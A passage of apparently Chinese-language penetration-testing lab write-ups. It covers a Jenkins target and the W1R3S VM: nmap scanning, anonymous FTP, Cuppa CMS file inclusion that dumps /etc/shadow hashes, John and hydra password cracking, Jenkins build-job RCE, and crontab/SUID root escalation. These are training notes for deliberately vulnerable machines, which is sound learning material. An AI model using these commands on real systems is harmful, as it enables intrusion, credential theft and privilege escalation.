class="hljs-number">5</span><br><span class="hljs-attribute">eder</span>:<span class="hljs-number">9</span>b<span class="hljs-number">38</span>e<span class="hljs-number">2</span>b<span class="hljs-number">1</span>e<span class="hljs-number">8</span>b<span class="hljs-number">12</span>f<span class="hljs-number">426</span>b<span class="hljs-number">0</span>d<span class="hljs-number">208</span>a<span class="hljs-number">7</span>ab<span class="hljs-number">6</span>cb<span class="hljs-number">98</span><br></code></pre></td></tr></table></figure><p>于是尝试md5 reverse</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">tiago:</span>italia99<br><span class="hljs-symbol">trindade:</span>marianna<br><span class="hljs-symbol">eder:</span>vipsu<br></code></pre></td></tr></table></figure><h3 id="jenkins攻击">Jenkins攻击</h3><p>将刚刚爆破出来的账号在Jenkin上测试发现，发现eder/vipsu能够顺利进入Jenkins后台。</p><p>尝试Jenkins的两种RCE方式</p><h4 id="脚本命令行rce">脚本命令行RCE</h4><p>Jenkins 右侧系统管理 -&gt; 脚本命令行</p><p>如下图，但是此种模式无法反弹shell</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022210700227.png" alt="image-20231022210700227" /></p><h4 id="构建任务rce">构建任务RCE</h4><p>选择新建任务</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022211658093.png" alt="image-20231022211658093" /></p><p>在构建这里选择<code>Execute shell</code>，在下方框中输入你需要执行的命令。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022211844571.png" alt="image-20231022211844571" /></p><p>输入完成之后，点击立即构建。</p><p>构建结束可以在下方构建记录的地方看到相应的信息。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022212345470.png" /></p><p>在构建记录的控制台完成相应的命令执行操作，可以看到构建了一个临时的shell脚本，然后执行相应的命令。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022212853661.png" alt="image-20231022212853661" /></p><h4 id="反弹shell">反弹shell</h4><p>利用刚刚第二种创建shell脚本的方式，能够顺利反弹shell</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022213700589.png" alt="image-20231022213700589" /></p><p>顺利拿到了shell</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022213731270.png" alt="image-20231022213731270" /></p><h2 id="crontab提权">Crontab提权</h2><p>扫描具备suid的可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>发现一个敏感服务，定时任务crontab</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/chage<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/sudo<br>/usr/bin/pkexec<br>/usr/bin/crontab<br>/usr/bin/passwd<br>/usr/sbin/pam_timestamp_check<br>/usr/sbin/unix_chkpwd<br>/usr/sbin/usernetctl<br>/usr/sbin/userhelper<br>/usr/lib/polkit-1/polkit-agent-helper-1<br>/usr/lib64/dbus-1/dbus-daemon-launch-helper<br></code></pre></td></tr></table></figure><p>查看crontab任务，发现一个root权限的任务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/crontab<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022215734691.png" alt="image-20231022215734691" /></p><p>查看该脚本的权限，发现是777权限，则我们只需要编辑该脚本就能够以root身份执行命令。</p><p>向该文件追加一行内容，使得</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>script/CleaningScript.sh<br></code></pre></td></tr></table></figure><p>获得root权限之后，执行如下命令，获取root权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -p<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022220716669.png" alt="image-20231022220716669" /></p><h2 id="总结">总结</h2><ol type="1"><li>Jenkins后台的两种RCE方式</li><li>Crontab提权</li></ol><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022220948981.png" alt="image-20231022220948981" /></p>]]></content>
    
    
    <categories>
      
      <category>攻防实战</category>
      
      <category>靶场笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
      <tag>nmap</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场笔记-w1r3s</title>
    <link href="/2023/10/22/blog0037-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-w1r3s/"/>
    <url>/2023/10/22/blog0037-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-w1r3s/</url>
    
    <content type="html"><![CDATA[<p>本篇涉及：nmap的精细化使用、ftp的拉取文件使用、Cuppa CMS攻击、shadow文件破解、sudo提权</p><span id="more"></span><h2 id="信息收集">信息收集</h2><h3 id="主机发现">主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sn 192.168.80.0/24<br></code></pre></td></tr></table></figure><p>扫描结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-21 12:51 EDT<br>Nmap scan report for 192.168.80.1<br>Host is up (0.00011s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report for 192.168.80.2<br>Host is up (0.000099s latency).<br>MAC Address: 00:50:56:E1:27:10 (VMware)<br>Nmap scan report for 192.168.80.146<br>Host is up (0.00058s latency).<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br>Nmap scan report for 192.168.80.254<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:F0:75:31 (VMware)<br>Nmap scan report for 192.168.80.128<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 1.98 seconds<br></code></pre></td></tr></table></figure><p>发现存在主机192.168.80.146</p><h3 id="端口扫描">端口扫描</h3><h4 id="tcp扫描">TCP扫描</h4><p><code>-sT</code>准确率更高，默认参数为<code>-sS</code>（SYN快速扫描）速度更快。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nmap -sT --min-rate 10000 -p- 192.168.80.146 -oA nmapscan/ports<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">Nmap 7.91 scan initiated Sat Oct 21 12:58:17 2023 as: nmap -sT --min-rate 10000 -p- -oA nmapscan/ports 192.168.80.146<br>Nmap scan report for 192.168.80.146<br>Host is up (0.00052s latency).<br>Not shown: 55528 filtered ports, 10003 closed ports<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br><br>Nmap done at Sat Oct 21 12:58:29 2023 -- 1 IP address (1 host up) scanned in 12.41 seconds<br><br></code></pre></td></tr></table></figure><p>获取端口服务的具体信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 将获取到的ports格式化管理</span><br>ports=$(grep open ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)<br><span class="hljs-meta">#</span><span class="bash"> 用默认的脚本扫描获取对应的端口版本</span><br>sudo nmap -sT -sV -sC -O 192.168.80.146 -p$ports -oA nampscan/ports_detail<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell">Nmap scan report for 192.168.80.146<br>Host is up (0.00034s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.80.128<br>|      Logged in as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 4<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)<br>|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)<br>|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>3306/tcp open  mysql   MySQL (unauthorized)<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose|storage-misc<br>Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6.32 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28<br>Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (97%), Linux 3.13 - 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 4.10 (91%), Linux 4.4 (91%), Linux 2.6.32 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.8 (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 20.59 seconds<br><br></code></pre></td></tr></table></figure><h4 id="udp扫描">UDP扫描</h4><p>刚刚使用的TCP扫描，此处改为使用UDP扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nmap -sU --top-ports 20 192.168.80.146 -oA nmapscan/udp_ports<br></code></pre></td></tr></table></figure><h4 id="漏洞扫描">漏洞扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nmap --script=vuln -p21,22,80,3306 192.168.80.146 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><h4 id="全扫描">全扫描</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.80.146</span><br></code></pre></td></tr></table></figure><h2 id="ftp攻击">ftp攻击</h2><h3 id="ftp信息收集">ftp信息收集</h3><p>注意到ftp支持匿名登陆。</p><p>ftp支持匿名登录，一般可以尝试ftp/anonymous作为用户名，空密码或者电子邮箱作为密码来进行登陆。</p><p>使用ftp/空密码登录，果然进去了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022002909828.png" alt="image-20231022002909828" /></p><p>全部拉取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget ftp://192.168.80.146:21/* --ftp-user=ftp --ftp-password=&quot;&quot; -r<br></code></pre></td></tr></table></figure><p>也可以进入ftp内部拉取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">binary // 启动二进制模式，尤其是拉取可执行文件<br>mget * // 拉取当前目录下的所有文件，不包含子目录文件<br>prompt // 关闭ftp的交互界面，拉取文件的时候不会提醒<br></code></pre></td></tr></table></figure><p>拉取了文件，有一个员工名单，但是一时也看不出来存在什么问题。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">The W1R3S<span class="hljs-selector-class">.inc</span> employee list<br><br>Naomi<span class="hljs-selector-class">.W</span> - Manager<br>Hector<span class="hljs-selector-class">.A</span> - IT Dept<br>Joseph<span class="hljs-selector-class">.G</span> - Web Design<br>Albert<span class="hljs-selector-class">.O</span> - Web Design<br>Gina<span class="hljs-selector-class">.L</span> - Inventory<br>Rico<span class="hljs-selector-class">.D</span> - Human Resource<br></code></pre></td></tr></table></figure><h2 id="mysql攻击">MySQL攻击</h2><p>尝试远程登陆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysql -h 192.168.80.146 -P3306 -uroot -p<br></code></pre></td></tr></table></figure><p>报错显示不允许远程登陆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ERROR 1130 (HY000): Host &#x27;192.168.80.128&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure><h2 id="http攻击">HTTP攻击</h2><p>访问80端口，发现也是默认的Apache页面。</p><h3 id="扫描目录">扫描目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python dirsearch -u http://192.168.80.146<br>sudo gobuster -u http://192.168.80.146 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <br></code></pre></td></tr></table></figure><p>扫描发现存在Cuppa CMS的安装界面</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022153945481.png" alt="image-20231022153945481" /></p><p>尝试搜索Cuppa CMS的历史漏洞，这里发现存在确实存在 : <a href="https://www.exploit-db.com/exploits/25971">Cuppa CMS文件包含</a></p><p>通过文件包含读取到<code>/etc/shadow</code>文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$vYcecPCy$JNbK.hr<span class="hljs-number">7</span>HU<span class="hljs-number">72</span>ifLxmjpIP<span class="hljs-number">9</span>kTcx./ak<span class="hljs-number">2</span>MM<span class="hljs-number">3</span>lBs.Ouiu<span class="hljs-number">0</span>mENav<span class="hljs-number">72</span>TfQIs<span class="hljs-number">8</span>h<span class="hljs-number">1</span>jPm<span class="hljs-number">2</span>rwRFqd<span class="hljs-number">87</span>HDC<span class="hljs-number">0</span>pi<span class="hljs-number">7</span>gn<span class="hljs-number">9</span>t<span class="hljs-number">7</span>VgZ<span class="hljs-number">0</span>:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">daemon</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">bin</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sys</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sync</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">games</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">man</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mail</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">news</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uucp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">proxy</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">www</span>-data:$<span class="hljs-number">6</span>$<span class="hljs-number">8</span>JMxE<span class="hljs-number">7</span>l<span class="hljs-number">0</span>$yQ<span class="hljs-number">16</span>jM..ZsFxpoGue<span class="hljs-number">8</span>/<span class="hljs-number">0</span>LBUnTas<span class="hljs-number">23</span>zaOqg<span class="hljs-number">2</span>Da<span class="hljs-number">47</span>vmykGTANfutzM<span class="hljs-number">8</span>MuFidtb<span class="hljs-number">0</span>..Zk.TUKDoDAVRCoXiZAH.Ud<span class="hljs-number">1</span>:<span class="hljs-number">17560</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">backup</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">list</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">irc</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">gnats</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">nobody</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-timesync:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-network:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-resolve:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-bus-proxy:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">syslog</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">_apt</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">messagebus</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uuidd</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lightdm</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">whoopsie</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>-autoipd:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">dnsmasq</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">colord</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">speech</span>-dispatcher:!:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">hplip</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">kernoops</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">pulse</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">rtkit</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">saned</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">usbmux</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">w1r3s</span>:$<span class="hljs-number">6</span>$xe/eyoTx$gttdIYrxrstpJP<span class="hljs-number">97</span>hWqttvc<span class="hljs-number">5</span>cGzDNyMb<span class="hljs-number">0</span>vSuppux<span class="hljs-number">4</span>f<span class="hljs-number">2</span>CcBv<span class="hljs-number">3</span>FwOt<span class="hljs-number">2</span>P<span class="hljs-number">1</span>GFLjZdNqjwRuP<span class="hljs-number">3</span>eUjkgb/io<span class="hljs-number">7</span>x<span class="hljs-number">9</span>q<span class="hljs-number">1</span>iP.:<span class="hljs-number">17567</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sshd</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">ftp</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mysql</span>:!:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><h2 id="john破解shadow">John破解shadow</h2><p>拿到了shadow文件之后，尝试获取密码的明文，这里我们可以使用john工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::&#x27; &gt; shadow.txt<br>john shadow.txt<br></code></pre></td></tr></table></figure><p>获得了w1r3s用户的密码为：computer</p><h2 id="sudoers配置">Sudoers配置</h2><p>使用w1r3s的用户名密码ssh登录靶机，成功拿到了shell</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022172735428.png" alt="image-20231022172735428" /></p><p>id命令查看当前w1r3s用户的权限，发现存在sudo权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure><h2 id="ssh暴力破解补充">SSH暴力破解（补充）</h2><p>使用hydra</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L users.list -P /usr/share/wordlists/rockyou.txt ssh://192.168.80.146 -t 4<br></code></pre></td></tr></table></figure><p>也可以使用msf</p><h2 id="总结">总结</h2><p>1、Nmap扫描技巧</p><p>2、ftp基本使用</p><p>3、John破解shadow</p><p>4、sudo提权</p>]]></content>
    
    
    <categories>
      
      <category>攻防实战</category>
      
